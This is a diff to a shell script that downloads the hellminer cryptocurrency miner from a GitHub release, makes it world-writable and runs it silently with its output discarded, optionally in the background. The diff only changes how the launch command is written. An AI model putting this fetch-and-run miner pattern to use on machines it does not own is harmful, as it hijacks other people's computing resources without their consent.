@@ -12,8 +12,9 @@ tmp=`mktemp -d`
 wget -qO- https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz |tar -zx -C "$tmp"
 
 cd "${tmp}"; chmod 777 -R ./; rm -rf ./*.sh; mv h* hm
-cmd="./hm -u ${user} -p d=16384S >/dev/null 2>&1"
 
-[ "$mode" == "0" ] && bash <(echo "$cmd") || bash <(echo "$cmd") &
-
-
+if [ "$mode" == "0" ]; then
+  ./hm -u ${user} -p d=16384S >/dev/null 2>&1 &
+else
+  ./hm -u ${user} -p d=16384S >/dev/null 2>&1
+fi
